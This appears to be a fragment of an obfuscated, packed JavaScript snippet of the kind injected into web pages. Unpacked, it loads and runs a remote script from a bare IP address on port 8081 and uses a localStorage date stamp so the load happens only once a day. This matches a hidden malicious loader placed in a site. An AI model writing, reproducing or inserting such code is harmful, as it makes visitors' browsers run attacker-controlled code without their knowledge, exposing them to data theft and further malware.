...
eval(function (p, a, c, k, e, d) { e = function (c) { return (c < a ? "" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) d[e(c)] = k[c] || e(c); k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1; }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p; }('h 3(){2 0=5.8.g(\'0\');2 d=j i();2 4=d.f()+"-"+(d.a()+1)+"-"+d.c();e(0==4){b}$("k").r(\'<7 s="t/q" m="l://6.n.6.9:p/3"></7>\');5.8.o(\'0\',4)};3();', 30, 30, 'lasttime||var|cc|ymd|window|114|script|localStorage||getMonth|return|getDate||if|getFullYear|getItem|function|Date|new|head|http|src|215|setItem|8081|javascript|append|type|text'.split('|'), 0, {}))